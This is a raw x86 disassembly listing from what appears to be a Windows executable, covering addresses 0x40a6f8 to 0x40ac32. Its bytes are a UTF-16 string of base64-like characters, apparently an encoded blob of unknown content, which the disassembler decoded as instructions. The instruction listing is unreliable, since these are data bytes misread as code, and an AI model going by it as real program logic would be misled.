  40a6f8:	32 00                	xor    (%eax),%al
  40a6fa:	50                   	push   %eax
  40a6fb:	00 66 00             	add    %ah,0x0(%esi)
  40a6fe:	30 00                	xor    %al,(%eax)
  40a700:	78 00                	js     0x40a702
  40a702:	73 00                	jae    0x40a704
  40a704:	39 00                	cmp    %eax,(%eax)
  40a706:	43                   	inc    %ebx
  40a707:	00 71 00             	add    %dh,0x0(%ecx)
  40a70a:	4c                   	dec    %esp
  40a70b:	00 56 00             	add    %dl,0x0(%esi)
  40a70e:	50                   	push   %eax
  40a70f:	00 6f 00             	add    %ch,0x0(%edi)
  40a712:	4b                   	dec    %ebx
  40a713:	00 2b                	add    %ch,(%ebx)
  40a715:	00 78 00             	add    %bh,0x0(%eax)
  40a718:	6f                   	outsl  %ds:(%esi),(%dx)
  40a719:	00 31                	add    %dh,(%ecx)
  40a71b:	00 52 00             	add    %dl,0x0(%edx)
  40a71e:	33 00                	xor    (%eax),%eax
  40a720:	45                   	inc    %ebp
  40a721:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40a725:	00 30                	add    %dh,(%eax)
  40a727:	00 6b 00             	add    %ch,0x0(%ebx)
  40a72a:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40a72e:	6d                   	insl   (%dx),%es:(%edi)
  40a72f:	00 75 00             	add    %dh,0x0(%ebp)
  40a732:	4f                   	dec    %edi
  40a733:	00 69 00             	add    %ch,0x0(%ecx)
  40a736:	59                   	pop    %ecx
  40a737:	00 78 00             	add    %bh,0x0(%eax)
  40a73a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a73b:	00 46 00             	add    %al,0x0(%esi)
  40a73e:	44                   	inc    %esp
  40a73f:	00 41 00             	add    %al,0x0(%ecx)
  40a742:	38 00                	cmp    %al,(%eax)
  40a744:	6c                   	insb   (%dx),%es:(%edi)
  40a745:	00 53 00             	add    %dl,0x0(%ebx)
  40a748:	73 00                	jae    0x40a74a
  40a74a:	55                   	push   %ebp
  40a74b:	00 4f 00             	add    %cl,0x0(%edi)
  40a74e:	67 00 36 00 6b       	add    %dh,0x6b00
  40a753:	00 58 00             	add    %bl,0x0(%eax)
  40a756:	32 00                	xor    (%eax),%al
  40a758:	53                   	push   %ebx
  40a759:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  40a75d:	00 55 00             	add    %dl,0x0(%ebp)
  40a760:	48                   	dec    %eax
  40a761:	00 6f 00             	add    %ch,0x0(%edi)
  40a764:	6a 00                	push   $0x0
  40a766:	4c                   	dec    %esp
  40a767:	00 38                	add    %bh,(%eax)
  40a769:	00 45 00             	add    %al,0x0(%ebp)
  40a76c:	64 00 74 00 31       	add    %dh,%fs:0x31(%eax,%eax,1)
  40a771:	00 75 00             	add    %dh,0x0(%ebp)
  40a774:	79 00                	jns    0x40a776
  40a776:	54                   	push   %esp
  40a777:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a77a:	68 00 2b 00 6a       	push   $0x6a002b00
  40a77f:	00 72 00             	add    %dh,0x0(%edx)
  40a782:	57                   	push   %edi
  40a783:	00 48 00             	add    %cl,0x0(%eax)
  40a786:	38 00                	cmp    %al,(%eax)
  40a788:	63 00                	arpl   %eax,(%eax)
  40a78a:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40a78e:	32 00                	xor    (%eax),%al
  40a790:	70 00                	jo     0x40a792
  40a792:	58                   	pop    %eax
  40a793:	00 72 00             	add    %dh,0x0(%edx)
  40a796:	39 00                	cmp    %eax,(%eax)
  40a798:	39 00                	cmp    %eax,(%eax)
  40a79a:	55                   	push   %ebp
  40a79b:	00 41 00             	add    %al,0x0(%ecx)
  40a79e:	77 00                	ja     0x40a7a0
  40a7a0:	31 00                	xor    %eax,(%eax)
  40a7a2:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40a7a6:	49                   	dec    %ecx
  40a7a7:	00 51 00             	add    %dl,0x0(%ecx)
  40a7aa:	76 00                	jbe    0x40a7ac
  40a7ac:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40a7b0:	75 00                	jne    0x40a7b2
  40a7b2:	4a                   	dec    %edx
  40a7b3:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40a7b7:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7ba:	45                   	inc    %ebp
  40a7bb:	00 4a 00             	add    %cl,0x0(%edx)
  40a7be:	75 00                	jne    0x40a7c0
  40a7c0:	36 00 39             	add    %bh,%ss:(%ecx)
  40a7c3:	00 76 00             	add    %dh,0x0(%esi)
  40a7c6:	38 00                	cmp    %al,(%eax)
  40a7c8:	4d                   	dec    %ebp
  40a7c9:	00 52 00             	add    %dl,0x0(%edx)
  40a7cc:	71 00                	jno    0x40a7ce
  40a7ce:	78 00                	js     0x40a7d0
  40a7d0:	31 00                	xor    %eax,(%eax)
  40a7d2:	79 00                	jns    0x40a7d4
  40a7d4:	66 00 38             	data16 add %bh,(%eax)
  40a7d7:	00 55 00             	add    %dl,0x0(%ebp)
  40a7da:	31 00                	xor    %eax,(%eax)
  40a7dc:	76 00                	jbe    0x40a7de
  40a7de:	78 00                	js     0x40a7e0
  40a7e0:	50                   	push   %eax
  40a7e1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a7e4:	7a 00                	jp     0x40a7e6
  40a7e6:	44                   	inc    %esp
  40a7e7:	00 45 00             	add    %al,0x0(%ebp)
  40a7ea:	38 00                	cmp    %al,(%eax)
  40a7ec:	36 00 36             	add    %dh,%ss:(%esi)
  40a7ef:	00 57 00             	add    %dl,0x0(%edi)
  40a7f2:	51                   	push   %ecx
  40a7f3:	00 32                	add    %dh,(%edx)
  40a7f5:	00 2f                	add    %ch,(%edi)
  40a7f7:	00 58 00             	add    %bl,0x0(%eax)
  40a7fa:	44                   	inc    %esp
  40a7fb:	00 42 00             	add    %al,0x0(%edx)
  40a7fe:	75 00                	jne    0x40a800
  40a800:	33 00                	xor    (%eax),%eax
  40a802:	46                   	inc    %esi
  40a803:	00 7a 00             	add    %bh,0x0(%edx)
  40a806:	33 00                	xor    (%eax),%eax
  40a808:	2f                   	das
  40a809:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40a80d:	00 50 00             	add    %dl,0x0(%eax)
  40a810:	4e                   	dec    %esi
  40a811:	00 31                	add    %dh,(%ecx)
  40a813:	00 59 00             	add    %bl,0x0(%ecx)
  40a816:	58                   	pop    %eax
  40a817:	00 33                	add    %dh,(%ebx)
  40a819:	00 67 00             	add    %ah,0x0(%edi)
  40a81c:	55                   	push   %ebp
  40a81d:	00 4f 00             	add    %cl,0x0(%edi)
  40a820:	79 00                	jns    0x40a822
  40a822:	6f                   	outsl  %ds:(%esi),(%dx)
  40a823:	00 48 00             	add    %cl,0x0(%eax)
  40a826:	39 00                	cmp    %eax,(%eax)
  40a828:	68 00 4a 00 71       	push   $0x71004a00
  40a82d:	00 43 00             	add    %al,0x0(%ebx)
  40a830:	43                   	inc    %ebx
  40a831:	00 77 00             	add    %dh,0x0(%edi)
  40a834:	63 00                	arpl   %eax,(%eax)
  40a836:	42                   	inc    %edx
  40a837:	00 56 00             	add    %dl,0x0(%esi)
  40a83a:	73 00                	jae    0x40a83c
  40a83c:	39 00                	cmp    %eax,(%eax)
  40a83e:	4f                   	dec    %edi
  40a83f:	00 77 00             	add    %dh,0x0(%edi)
  40a842:	34 00                	xor    $0x0,%al
  40a844:	5a                   	pop    %edx
  40a845:	00 52 00             	add    %dl,0x0(%edx)
  40a848:	39 00                	cmp    %eax,(%eax)
  40a84a:	50                   	push   %eax
  40a84b:	00 6f 00             	add    %ch,0x0(%edi)
  40a84e:	6c                   	insb   (%dx),%es:(%edi)
  40a84f:	00 2f                	add    %ch,(%edi)
  40a851:	00 77 00             	add    %dh,0x0(%edi)
  40a854:	61                   	popa
  40a855:	00 76 00             	add    %dh,0x0(%esi)
  40a858:	35 00 6f 00 41       	xor    $0x41006f00,%eax
  40a85d:	00 66 00             	add    %ah,0x0(%esi)
  40a860:	67 00 6d 00          	add    %ch,0x0(%di)
  40a864:	6f                   	outsl  %ds:(%esi),(%dx)
  40a865:	00 50 00             	add    %dl,0x0(%eax)
  40a868:	37                   	aaa
  40a869:	00 67 00             	add    %ah,0x0(%edi)
  40a86c:	59                   	pop    %ecx
  40a86d:	00 77 00             	add    %dh,0x0(%edi)
  40a870:	52                   	push   %edx
  40a871:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40a875:	00 56 00             	add    %dl,0x0(%esi)
  40a878:	7a 00                	jp     0x40a87a
  40a87a:	42                   	inc    %edx
  40a87b:	00 6a 00             	add    %ch,0x0(%edx)
  40a87e:	6c                   	insb   (%dx),%es:(%edi)
  40a87f:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40a883:	00 2b                	add    %ch,(%ebx)
  40a885:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40a889:	00 50 00             	add    %dl,0x0(%eax)
  40a88c:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40a890:	71 00                	jno    0x40a892
  40a892:	50                   	push   %eax
  40a893:	00 43 00             	add    %al,0x0(%ebx)
  40a896:	32 00                	xor    (%eax),%al
  40a898:	61                   	popa
  40a899:	00 38                	add    %bh,(%eax)
  40a89b:	00 35 00 64 00 32    	add    %dh,0x32006400
  40a8a1:	00 69 00             	add    %ch,0x0(%ecx)
  40a8a4:	47                   	inc    %edi
  40a8a5:	00 30                	add    %dh,(%eax)
  40a8a7:	00 47 00             	add    %al,0x0(%edi)
  40a8aa:	55                   	push   %ebp
  40a8ab:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  40a8af:	00 4e 00             	add    %cl,0x0(%esi)
  40a8b2:	41                   	inc    %ecx
  40a8b3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a8b6:	73 00                	jae    0x40a8b8
  40a8b8:	63 00                	arpl   %eax,(%eax)
  40a8ba:	4b                   	dec    %ebx
  40a8bb:	00 36                	add    %dh,(%esi)
  40a8bd:	00 48 00             	add    %cl,0x0(%eax)
  40a8c0:	45                   	inc    %ebp
  40a8c1:	00 33                	add    %dh,(%ebx)
  40a8c3:	00 48 00             	add    %cl,0x0(%eax)
  40a8c6:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40a8ca:	55                   	push   %ebp
  40a8cb:	00 5a 00             	add    %bl,0x0(%edx)
  40a8ce:	33 00                	xor    (%eax),%eax
  40a8d0:	44                   	inc    %esp
  40a8d1:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40a8d5:	00 39                	add    %bh,(%ecx)
  40a8d7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a8da:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  40a8de:	43                   	inc    %ebx
  40a8df:	00 30                	add    %dh,(%eax)
  40a8e1:	00 70 00             	add    %dh,0x0(%eax)
  40a8e4:	49                   	dec    %ecx
  40a8e5:	00 46 00             	add    %al,0x0(%esi)
  40a8e8:	76 00                	jbe    0x40a8ea
  40a8ea:	74 00                	je     0x40a8ec
  40a8ec:	78 00                	js     0x40a8ee
  40a8ee:	6c                   	insb   (%dx),%es:(%edi)
  40a8ef:	00 71 00             	add    %dh,0x0(%ecx)
  40a8f2:	71 00                	jno    0x40a8f4
  40a8f4:	53                   	push   %ebx
  40a8f5:	00 66 00             	add    %ah,0x0(%esi)
  40a8f8:	73 00                	jae    0x40a8fa
  40a8fa:	45                   	inc    %ebp
  40a8fb:	00 35 00 6d 00 75    	add    %dh,0x75006d00
  40a901:	00 72 00             	add    %dh,0x0(%edx)
  40a904:	72 00                	jb     0x40a906
  40a906:	6a 00                	push   $0x0
  40a908:	58                   	pop    %eax
  40a909:	00 73 00             	add    %dh,0x0(%ebx)
  40a90c:	34 00                	xor    $0x0,%al
  40a90e:	32 00                	xor    (%eax),%al
  40a910:	2b 00                	sub    (%eax),%eax
  40a912:	38 00                	cmp    %al,(%eax)
  40a914:	61                   	popa
  40a915:	00 37                	add    %dh,(%edi)
  40a917:	00 75 00             	add    %dh,0x0(%ebp)
  40a91a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a91b:	00 63 00             	add    %ah,0x0(%ebx)
  40a91e:	56                   	push   %esi
  40a91f:	00 6f 00             	add    %ch,0x0(%edi)
  40a922:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40a926:	35 00 78 00 6a       	xor    $0x6a007800,%eax
  40a92b:	00 68 00             	add    %ch,0x0(%eax)
  40a92e:	77 00                	ja     0x40a930
  40a930:	44                   	inc    %esp
  40a931:	00 53 00             	add    %dl,0x0(%ebx)
  40a934:	56                   	push   %esi
  40a935:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40a939:	00 4a 00             	add    %cl,0x0(%edx)
  40a93c:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40a940:	4d                   	dec    %ebp
  40a941:	00 36                	add    %dh,(%esi)
  40a943:	00 52 00             	add    %dl,0x0(%edx)
  40a946:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40a949:	00 43 00             	add    %al,0x0(%ebx)
  40a94c:	41                   	inc    %ecx
  40a94d:	00 57 00             	add    %dl,0x0(%edi)
  40a950:	55                   	push   %ebp
  40a951:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40a955:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40a959:	00 33                	add    %dh,(%ebx)
  40a95b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a95e:	2b 00                	sub    (%eax),%eax
  40a960:	68 00 50 00 68       	push   $0x68005000
  40a965:	00 32                	add    %dh,(%edx)
  40a967:	00 4b 00             	add    %cl,0x0(%ebx)
  40a96a:	51                   	push   %ecx
  40a96b:	00 76 00             	add    %dh,0x0(%esi)
  40a96e:	45                   	inc    %ebp
  40a96f:	00 37                	add    %dh,(%edi)
  40a971:	00 55 00             	add    %dl,0x0(%ebp)
  40a974:	4c                   	dec    %esp
  40a975:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40a979:	00 62 00             	add    %ah,0x0(%edx)
  40a97c:	31 00                	xor    %eax,(%eax)
  40a97e:	4f                   	dec    %edi
  40a97f:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40a983:	00 30                	add    %dh,(%eax)
  40a985:	00 72 00             	add    %dh,0x0(%edx)
  40a988:	75 00                	jne    0x40a98a
  40a98a:	66 00 37             	data16 add %dh,(%edi)
  40a98d:	00 56 00             	add    %dl,0x0(%esi)
  40a990:	65 00 74 00 7a       	add    %dh,%gs:0x7a(%eax,%eax,1)
  40a995:	00 7a 00             	add    %bh,0x0(%edx)
  40a998:	37                   	aaa
  40a999:	00 4e 00             	add    %cl,0x0(%esi)
  40a99c:	6a 00                	push   $0x0
  40a99e:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40a9a2:	33 00                	xor    (%eax),%eax
  40a9a4:	57                   	push   %edi
  40a9a5:	00 45 00             	add    %al,0x0(%ebp)
  40a9a8:	44                   	inc    %esp
  40a9a9:	00 62 00             	add    %ah,0x0(%edx)
  40a9ac:	73 00                	jae    0x40a9ae
  40a9ae:	39 00                	cmp    %eax,(%eax)
  40a9b0:	4e                   	dec    %esi
  40a9b1:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40a9b5:	00 51 00             	add    %dl,0x0(%ecx)
  40a9b8:	73 00                	jae    0x40a9ba
  40a9ba:	72 00                	jb     0x40a9bc
  40a9bc:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40a9c0:	4f                   	dec    %edi
  40a9c1:	00 57 00             	add    %dl,0x0(%edi)
  40a9c4:	52                   	push   %edx
  40a9c5:	00 41 00             	add    %al,0x0(%ecx)
  40a9c8:	48                   	dec    %eax
  40a9c9:	00 57 00             	add    %dl,0x0(%edi)
  40a9cc:	5a                   	pop    %edx
  40a9cd:	00 57 00             	add    %dl,0x0(%edi)
  40a9d0:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40a9d4:	50                   	push   %eax
  40a9d5:	00 33                	add    %dh,(%ebx)
  40a9d7:	00 72 00             	add    %dh,0x0(%edx)
  40a9da:	52                   	push   %edx
  40a9db:	00 7a 00             	add    %bh,0x0(%edx)
  40a9de:	44                   	inc    %esp
  40a9df:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9e2:	67 00 32             	add    %dh,(%bp,%si)
  40a9e5:	00 70 00             	add    %dh,0x0(%eax)
  40a9e8:	49                   	dec    %ecx
  40a9e9:	00 47 00             	add    %al,0x0(%edi)
  40a9ec:	37                   	aaa
  40a9ed:	00 36                	add    %dh,(%esi)
  40a9ef:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40a9f3:	00 79 00             	add    %bh,0x0(%ecx)
  40a9f6:	33 00                	xor    (%eax),%eax
  40a9f8:	7a 00                	jp     0x40a9fa
  40a9fa:	55                   	push   %ebp
  40a9fb:	00 71 00             	add    %dh,0x0(%ecx)
  40a9fe:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40aa02:	70 00                	jo     0x40aa04
  40aa04:	46                   	inc    %esi
  40aa05:	00 77 00             	add    %dh,0x0(%edi)
  40aa08:	6b 00 58             	imul   $0x58,(%eax),%eax
  40aa0b:	00 41 00             	add    %al,0x0(%ecx)
  40aa0e:	6c                   	insb   (%dx),%es:(%edi)
  40aa0f:	00 56 00             	add    %dl,0x0(%esi)
  40aa12:	53                   	push   %ebx
  40aa13:	00 71 00             	add    %dh,0x0(%ecx)
  40aa16:	72 00                	jb     0x40aa18
  40aa18:	4b                   	dec    %ebx
  40aa19:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40aa1d:	00 2b                	add    %ch,(%ebx)
  40aa1f:	00 42 00             	add    %al,0x0(%edx)
  40aa22:	74 00                	je     0x40aa24
  40aa24:	67 00 31             	add    %dh,(%bx,%di)
  40aa27:	00 72 00             	add    %dh,0x0(%edx)
  40aa2a:	63 00                	arpl   %eax,(%eax)
  40aa2c:	45                   	inc    %ebp
  40aa2d:	00 72 00             	add    %dh,0x0(%edx)
  40aa30:	4c                   	dec    %esp
  40aa31:	00 32                	add    %dh,(%edx)
  40aa33:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  40aa37:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa3a:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa3b:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40aa3f:	00 76 00             	add    %dh,0x0(%esi)
  40aa42:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40aa46:	48                   	dec    %eax
  40aa47:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  40aa4b:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40aa4f:	00 30                	add    %dh,(%eax)
  40aa51:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa54:	4f                   	dec    %edi
  40aa55:	00 63 00             	add    %ah,0x0(%ebx)
  40aa58:	53                   	push   %ebx
  40aa59:	00 66 00             	add    %ah,0x0(%esi)
  40aa5c:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa5d:	00 56 00             	add    %dl,0x0(%esi)
  40aa60:	4d                   	dec    %ebp
  40aa61:	00 36                	add    %dh,(%esi)
  40aa63:	00 47 00             	add    %al,0x0(%edi)
  40aa66:	78 00                	js     0x40aa68
  40aa68:	5a                   	pop    %edx
  40aa69:	00 51 00             	add    %dl,0x0(%ecx)
  40aa6c:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa6d:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa70:	46                   	inc    %esi
  40aa71:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa74:	78 00                	js     0x40aa76
  40aa76:	39 00                	cmp    %eax,(%eax)
  40aa78:	45                   	inc    %ebp
  40aa79:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40aa7d:	00 6a 00             	add    %ch,0x0(%edx)
  40aa80:	48                   	dec    %eax
  40aa81:	00 73 00             	add    %dh,0x0(%ebx)
  40aa84:	63 00                	arpl   %eax,(%eax)
  40aa86:	70 00                	jo     0x40aa88
  40aa88:	78 00                	js     0x40aa8a
  40aa8a:	78 00                	js     0x40aa8c
  40aa8c:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40aa90:	49                   	dec    %ecx
  40aa91:	00 63 00             	add    %ah,0x0(%ebx)
  40aa94:	56                   	push   %esi
  40aa95:	00 79 00             	add    %bh,0x0(%ecx)
  40aa98:	37                   	aaa
  40aa99:	00 30                	add    %dh,(%eax)
  40aa9b:	00 68 00             	add    %ch,0x0(%eax)
  40aa9e:	32 00                	xor    (%eax),%al
  40aaa0:	32 00                	xor    (%eax),%al
  40aaa2:	43                   	inc    %ebx
  40aaa3:	00 7a 00             	add    %bh,0x0(%edx)
  40aaa6:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40aaa9:	00 68 00             	add    %ch,0x0(%eax)
  40aaac:	46                   	inc    %esi
  40aaad:	00 65 00             	add    %ah,0x0(%ebp)
  40aab0:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40aab4:	2b 00                	sub    (%eax),%eax
  40aab6:	54                   	push   %esp
  40aab7:	00 7a 00             	add    %bh,0x0(%edx)
  40aaba:	34 00                	xor    $0x0,%al
  40aabc:	67 00 66 00          	add    %ah,0x0(%bp)
  40aac0:	2f                   	das
  40aac1:	00 66 00             	add    %ah,0x0(%esi)
  40aac4:	47                   	inc    %edi
  40aac5:	00 77 00             	add    %dh,0x0(%edi)
  40aac8:	73 00                	jae    0x40aaca
  40aaca:	59                   	pop    %ecx
  40aacb:	00 43 00             	add    %al,0x0(%ebx)
  40aace:	54                   	push   %esp
  40aacf:	00 6a 00             	add    %ch,0x0(%edx)
  40aad2:	56                   	push   %esi
  40aad3:	00 63 00             	add    %ah,0x0(%ebx)
  40aad6:	5a                   	pop    %edx
  40aad7:	00 36                	add    %dh,(%esi)
  40aad9:	00 4a 00             	add    %cl,0x0(%edx)
  40aadc:	38 00                	cmp    %al,(%eax)
  40aade:	55                   	push   %ebp
  40aadf:	00 43 00             	add    %al,0x0(%ebx)
  40aae2:	57                   	push   %edi
  40aae3:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40aae7:	00 53 00             	add    %dl,0x0(%ebx)
  40aaea:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40aaee:	4d                   	dec    %ebp
  40aaef:	00 49 00             	add    %cl,0x0(%ecx)
  40aaf2:	38 00                	cmp    %al,(%eax)
  40aaf4:	35 00 56 00 30       	xor    $0x30005600,%eax
  40aaf9:	00 2b                	add    %ch,(%ebx)
  40aafb:	00 62 00             	add    %ah,0x0(%edx)
  40aafe:	52                   	push   %edx
  40aaff:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab02:	68 00 64 00 39       	push   $0x39006400
  40ab07:	00 6f 00             	add    %ch,0x0(%edi)
  40ab0a:	34 00                	xor    $0x0,%al
  40ab0c:	6c                   	insb   (%dx),%es:(%edi)
  40ab0d:	00 69 00             	add    %ch,0x0(%ecx)
  40ab10:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab11:	00 77 00             	add    %dh,0x0(%edi)
  40ab14:	47                   	inc    %edi
  40ab15:	00 72 00             	add    %dh,0x0(%edx)
  40ab18:	4c                   	dec    %esp
  40ab19:	00 70 00             	add    %dh,0x0(%eax)
  40ab1c:	49                   	dec    %ecx
  40ab1d:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40ab21:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40ab25:	00 50 00             	add    %dl,0x0(%eax)
  40ab28:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40ab2c:	6d                   	insl   (%dx),%es:(%edi)
  40ab2d:	00 70 00             	add    %dh,0x0(%eax)
  40ab30:	44                   	inc    %esp
  40ab31:	00 32                	add    %dh,(%edx)
  40ab33:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab36:	75 00                	jne    0x40ab38
  40ab38:	43                   	inc    %ebx
  40ab39:	00 32                	add    %dh,(%edx)
  40ab3b:	00 30                	add    %dh,(%eax)
  40ab3d:	00 50 00             	add    %dl,0x0(%eax)
  40ab40:	53                   	push   %ebx
  40ab41:	00 2b                	add    %ch,(%ebx)
  40ab43:	00 59 00             	add    %bl,0x0(%ecx)
  40ab46:	54                   	push   %esp
  40ab47:	00 76 00             	add    %dh,0x0(%esi)
  40ab4a:	43                   	inc    %ebx
  40ab4b:	00 78 00             	add    %bh,0x0(%eax)
  40ab4e:	4f                   	dec    %edi
  40ab4f:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40ab53:	00 59 00             	add    %bl,0x0(%ecx)
  40ab56:	72 00                	jb     0x40ab58
  40ab58:	62 00                	bound  %eax,(%eax)
  40ab5a:	4f                   	dec    %edi
  40ab5b:	00 58 00             	add    %bl,0x0(%eax)
  40ab5e:	6d                   	insl   (%dx),%es:(%edi)
  40ab5f:	00 33                	add    %dh,(%ebx)
  40ab61:	00 33                	add    %dh,(%ebx)
  40ab63:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab66:	33 00                	xor    (%eax),%eax
  40ab68:	6d                   	insl   (%dx),%es:(%edi)
  40ab69:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40ab6d:	00 6f 00             	add    %ch,0x0(%edi)
  40ab70:	41                   	inc    %ecx
  40ab71:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab74:	48                   	dec    %eax
  40ab75:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40ab79:	00 5a 00             	add    %bl,0x0(%edx)
  40ab7c:	41                   	inc    %ecx
  40ab7d:	00 6e 00             	add    %ch,0x0(%esi)
  40ab80:	7a 00                	jp     0x40ab82
  40ab82:	55                   	push   %ebp
  40ab83:	00 32                	add    %dh,(%edx)
  40ab85:	00 5a 00             	add    %bl,0x0(%edx)
  40ab88:	4e                   	dec    %esi
  40ab89:	00 32                	add    %dh,(%edx)
  40ab8b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab8e:	4e                   	dec    %esi
  40ab8f:	00 45 00             	add    %al,0x0(%ebp)
  40ab92:	5a                   	pop    %edx
  40ab93:	00 51 00             	add    %dl,0x0(%ecx)
  40ab96:	67 00 30             	add    %dh,(%bx,%si)
  40ab99:	00 35 00 70 00 45    	add    %dh,0x45007000
  40ab9f:	00 67 00             	add    %ah,0x0(%edi)
  40aba2:	31 00                	xor    %eax,(%eax)
  40aba4:	6e                   	outsb  %ds:(%esi),(%dx)
  40aba5:	00 4f 00             	add    %cl,0x0(%edi)
  40aba8:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40abac:	6a 00                	push   $0x0
  40abae:	6d                   	insl   (%dx),%es:(%edi)
  40abaf:	00 56 00             	add    %dl,0x0(%esi)
  40abb2:	4d                   	dec    %ebp
  40abb3:	00 65 00             	add    %ah,0x0(%ebp)
  40abb6:	69 00 4d 00 34 00    	imul   $0x34004d,(%eax),%eax
  40abbc:	51                   	push   %ecx
  40abbd:	00 36                	add    %dh,(%esi)
  40abbf:	00 37                	add    %dh,(%edi)
  40abc1:	00 41 00             	add    %al,0x0(%ecx)
  40abc4:	43                   	inc    %ebx
  40abc5:	00 4a 00             	add    %cl,0x0(%edx)
  40abc8:	4b                   	dec    %ebx
  40abc9:	00 55 00             	add    %dl,0x0(%ebp)
  40abcc:	67 00 57 00          	add    %dl,0x0(%bx)
  40abd0:	4f                   	dec    %edi
  40abd1:	00 41 00             	add    %al,0x0(%ecx)
  40abd4:	4d                   	dec    %ebp
  40abd5:	00 4b 00             	add    %cl,0x0(%ebx)
  40abd8:	46                   	inc    %esi
  40abd9:	00 4a 00             	add    %cl,0x0(%edx)
  40abdc:	49                   	dec    %ecx
  40abdd:	00 41 00             	add    %al,0x0(%ecx)
  40abe0:	53                   	push   %ebx
  40abe1:	00 55 00             	add    %dl,0x0(%ebp)
  40abe4:	2f                   	das
  40abe5:	00 36                	add    %dh,(%esi)
  40abe7:	00 63 00             	add    %ah,0x0(%ebx)
  40abea:	65 00 6c 00 42       	add    %ch,%gs:0x42(%eax,%eax,1)
  40abef:	00 50 00             	add    %dl,0x0(%eax)
  40abf2:	73 00                	jae    0x40abf4
  40abf4:	55                   	push   %ebp
  40abf5:	00 53 00             	add    %dl,0x0(%ebx)
  40abf8:	73 00                	jae    0x40abfa
  40abfa:	51                   	push   %ecx
  40abfb:	00 6b 00             	add    %ch,0x0(%ebx)
  40abfe:	33 00                	xor    (%eax),%eax
  40ac00:	77 00                	ja     0x40ac02
  40ac02:	6c                   	insb   (%dx),%es:(%edi)
  40ac03:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac06:	79 00                	jns    0x40ac08
  40ac08:	6c                   	insb   (%dx),%es:(%edi)
  40ac09:	00 38                	add    %bh,(%eax)
  40ac0b:	00 4a 00             	add    %cl,0x0(%edx)
  40ac0e:	39 00                	cmp    %eax,(%eax)
  40ac10:	74 00                	je     0x40ac12
  40ac12:	74 00                	je     0x40ac14
  40ac14:	4b                   	dec    %ebx
  40ac15:	00 77 00             	add    %dh,0x0(%edi)
  40ac18:	69 00 42 00 42 00    	imul   $0x420042,(%eax),%eax
  40ac1e:	69 00 37 00 6c 00    	imul   $0x6c0037,(%eax),%eax
  40ac24:	66 00 46 00          	data16 add %al,0x0(%esi)
  40ac28:	47                   	inc    %edi
  40ac29:	00 31                	add    %dh,(%ecx)
  40ac2b:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac2e:	5a                   	pop    %edx
  40ac2f:	00 51 00             	add    %dl,0x0(%ecx)
  40ac32:	63 00                	arpl   %eax,(%eax)
